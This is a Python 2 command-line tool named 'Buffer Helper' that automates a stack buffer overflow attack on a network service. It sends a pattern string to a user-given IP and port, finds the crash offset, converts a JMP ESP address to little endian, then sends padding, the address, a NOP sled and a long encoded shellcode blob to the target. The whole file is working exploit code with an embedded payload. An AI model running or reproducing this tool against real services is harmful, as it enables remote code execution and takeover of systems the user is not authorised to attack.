#!/usr/bin/env python2

# -*- coding: utf-8 -*-

import random
import string
import socket 
import time
import readline

class Buffer_Over:
     def __init__(self):
         self.Banner() 
         self.ip_port()
         self.string_ramdon()
         self.connect_servser()
         self.option_return()
         self.hexadecimal() 
         self.payload()
         self.little_endian()        
         self.attack_all()
         self.Banner()
         
     def ip_port(self):
       try:
          self.server_ip=str(raw_input("\n[+]server ip : "))
          time.sleep(2)
          self.server_port=int(raw_input("\n[+]server port :")) 
       except Exception:
             print"\n[#]Please Check Ip and the Port [#]"  
             return  self.ip_port()    
       except KeyboardInterrupt:
           self.Banner() 
           exit()
     def string_ramdon(self):
         try:
	 	 self.Requst_String = int (raw_input("\n[+]Enter your reguset:"))
		 time.sleep(2)
		 self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(self.Requst_String )).lower()  
                 self.Random_String = bytearray(self.Random_String)
		 print "\n[+]String is Generated  length is:",len(self.Random_String ),"\n\n",(self.Random_String).strip()
         except Exception:
              time.sleep(2)
              print "\n[()]check your input [()]"
              return self.string_ramdon()		 
         except KeyboardInterrupt:
                  self.Banner() 
                  exit()
 
     def connect_servser(self):
          while True:
	        try:
	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		    socket_1.connect((self.server_ip,self.server_port))
		    data = socket_1.recv(1023)
		    if socket_1.send( self.Random_String + '\r\n'):
		       time.sleep(2)
	      	       print "\n[+]data send successful...!!!"
		       socket_1.close()
		       break 
	        except Exception:
	            time.sleep(2)
	            print "\n[:::::'Connection Error :::::']"
	            time.sleep(2)
	            print"\n[#]Please check ip and the port [#]"
		    self.ip_port()
		    continue
                except KeyboardInterrupt:
                  self.Banner() 
                  exit()
     def option_return(self):
        try:
             continue_1   = "c".lower()            
             return_back  = "b".lower()
             op_sel = str(raw_input("\n[<>]to continue press C  to back  press B: ")).lower()
             if op_sel== continue_1 and  len(op_sel)==1:
                pass
             elif op_sel ==return_back and len(op_sel)==1:
                  self.string_ramdon()
                  self.connect_servser()
                  self.option_return()
             else:
                  print"\n[-]please Enter the C or B [-]" 
                  self.option_return()
        except KeyboardInterrupt:
                  self.Banner() 
                  exit()            
     def hexadecimal (self):                                                                           
          while True:
                 try: 
		    self.hexadecimal = str(raw_input("\n[+]Enter hexadecimal Crach address: ")).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
		        print "\n[+]The ASCII Value  is : ",self.ASCII
		        time.sleep(2)
		        self.location = self.Random_String.find(self.ASCII)
		        print "\n[+]Exact satch at offset : ",self.location
	                break
                    else:
	               print "\n[(*)]THE VALUE  OF THE ADDRESS FOUND  IN OUR STRING[(*)] "
	               time.sleep(2)
	               return self.hexadecimal()   
	         except Exception:
	           pass              
                 except KeyboardInterrupt:
                      self.Banner() 
                      exit() 
     def payload(self):
         self.shellcode = (
"\xba\xec\x3d\xc8\x56\xdd\xc1\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x71\x31\x57\x13\x83\xc7\x04\x03\x57\xe3\xdf\x3d\x8f\x17\xc6"
"\xca\x14\x13\x43\x05\x99\x47\x40\x32\x12\xbe\x18\xa9\x65\x10"
"\x42\xad\x6e\x6c\x77\xe1\x7b\x59\x41\x46\xad\xa1\x04\x14\x8b"
"\x8c\xe2\x8f\xac\x0f\xc8\xaa\x1b\xdf\xee\x82\xba\x57\x33\x3a"
"\x60\x48\xd0\xe7\x54\xfb\x90\x92\x32\xaa\x5f\xb9\xe5\xec\xcf"
"\x98\xa8\xaa\xa5\x8d\xbf\xaf\xd1\x33\xf7\x9c\x02\xc5\x77\xf9"
"\xac\x52\xfa\x57\x6e\x15\x4d\x3c\x67\xa0\x04\xda\x9e\xdf\x17"
"\xba\x18\xf2\xc9\xaa\x01\xf4\x77\xad\xc0\x95\xf0\xa1\xcc\x8c"
"\x61\x05\x9b\x2d\x0f\xdb\xa7\x2f\x15\xfd\x5b\x8d\x10\xc1\xaa"
"\x7f\x38\x81\xe7\xdf\xfb\xa0\x42\x32\x66\xcb\x71\x91\x12\x9c"
"\x45\x04\xda\xf0\x15\x2b\x47\x0e\xf7\xeb\xd5\x62\x31\x77\x22"
"\x5e\xc0\xb7\xb7\x1f\xd3\x2e\x10\xd9\x0f\x79\xa4\x75\xbb\x9a"
"\x41\xe4\xb0\x1b\xc6\xf8\x9b\x6a\x09\xed\xad\x32\x8e\x2f\xb8"
"\xf3\x9f\xf7\x90\x31\x46\x64\x7a\xbd\x61\x2f\x9b\xf4\x36\xf0"
"\xc8\x2f\x0f\x21\xc7\x99\x23\xa8\xea\xef\xc1\x1e\x60\x8f\x96"
"\xb3\xd9\xc7\x52\x0c\xc8\x51\xaa\x85\xb9\x07\x68\x08\x31\x7f"
"\x0f\xaa\x83\x65\xb2\xe9\x2e\xaf\xa1\xbd\xc6\x1e\xaa\x42\x9f"
"\x7f\x29\x80\x45\xc9\x2b\x0b\x22\x22\xc0\x59\x67\x08\x6e\x32"
"\x12\xac\x55\x71\x62\xfc\x8a\xd2\x66\x01\x92\xfe\xa1\xc9\xe8"
"\xd7\x94\x30\xb5\xcd\x24\x93\xf1\xe4\xf4\x18\x76\x57\x36\xe7"
"\x99\xec\x69\x56\xcc\xb1\x2f\x5e\xf7\xe6\x99\x5a\x63\x45\x8f"
"\x49\x70\xd5\x29\xbf\xd2\x55\x1b\x84\x68\x3e\xb5\x89\x4e\x32"
"\x09\x45\xd5\x7b\x2a\x48\x1f\x07\xa7\xc1\x5e\x65\x67\xcf\x88"
"\x15\xc2\x36\x88\xa0\xd8\x25\x65\xfb\x65\xdc\x0c\x9d\x4c\x05"
"\x23\xc4\xc9\xfa\x9f\xcb\x6f\x3d\x8a\xd4\x7c\x99\x38\xa4\x95"
"\x6e\x98\xe7\xac\xcc\xc6\x01\xa3\xfb\x3f\xb1\x64\xa4\xe9\xcf"
"\x5f\x2d\x19\xfa\xc4\x97\x04\x33\x58\xf8\x61\xcf\x04\x51\x02"
"\x3b\x3a\x18\xdd\x6c\xb9\x06\x93\x33\xe2\x77\x88\x05\xea\xf6"
"\xe5\x2f\x85\xcb\xc2\x77\xea\xfa\xc1\xe4\x68\xef\x22\x45\x94"
"\xc1\x81\x84\x34\x97\x2d\xb7\x51\x82\x41\x49\x1a\x37\x92\x95"
"\xad\xde\x73\xc7\x5f\x08\x2b\x96\x44\x5c\x93"
                          )
         
         
     def little_endian(self):
             try:
                jump= raw_input("\n[+] Enter JMP ESP addrsss HEX  : ").upper()
                self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                self.display =self.jump_address# for print olnly
                self.display = " ".join("\\x%s"%self.display[i:i+2] for i in range(0, len(self.display), 2))
                self.display= self.display.replace(" ", "")
                time.sleep(2)
                self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                print "\n[+]little endian JMP ESP  is : ", self.display
             except KeyboardInterrupt:
                self.Banner() 
                exit()
             
     def attack_all(self):
	       try: 
                                  
                   socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   Start_string = self.location*"A"        
                   NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address) 
                   NO_Operation = NO_Operation*"\x90"   
                   attack = Start_string+self.jump_address+ NO_Operation +self.shellcode 
                   print '\n[+] attack =',len(Start_string),'of "A" + JMP ESP =', self.display ,'+',NO_Operation.count("\x90"),'of("\\x90") '" + shell code"
                   time.sleep(2)
                   print "\n[+]conncet server ip is  : ", self.server_ip
                   time.sleep(2)
                   print "\n[+]conncet server port is  : ", self.server_port         
                   socket_2.connect((self.server_ip,self.server_port))
                   print "\n[+]WE READY TO ATTACK !![+]"  
                   data_recv  = socket_2.recv(1024)
                   if socket_2.send( attack + '\r\n'):
                        time.sleep(2)
	                print "\n[+]data send successful...!!!"
                        socket_2.close()
                        self.Banner() 
                        exit() 
               except socket.error, exc:
                          time.sleep(3)
                          print "\n[(!)]Caught exception socket.error : %s\n" % exc
                          time.sleep(2) 
                          self.Banner()                                   	
                          exit()
               except KeyboardInterrupt:
                  self.Banner() 
                  exit()
                          
     def Banner(self):
           print"""
 ____         __  __             _   _      _                  
| __ ) _   _ / _|/ _| ___ _ __  | | | | ___| |_ __   ___ _ __  
|  _ \| | | | |_| |_ / _ \ '__| | |_| |/ _ \ | '_ \ / _ \ '__| 
| |_) | |_| |  _|  _|  __/ |    |  _  |  __/ | |_) |  __/ |    
|____/ \__,_|_| |_|  \___|_|    |_| |_|\___|_| .__/ \___|_|    
                                             |_|        
"""   
                  
                  
if __name__ == '__main__':
   Buffer_Over()




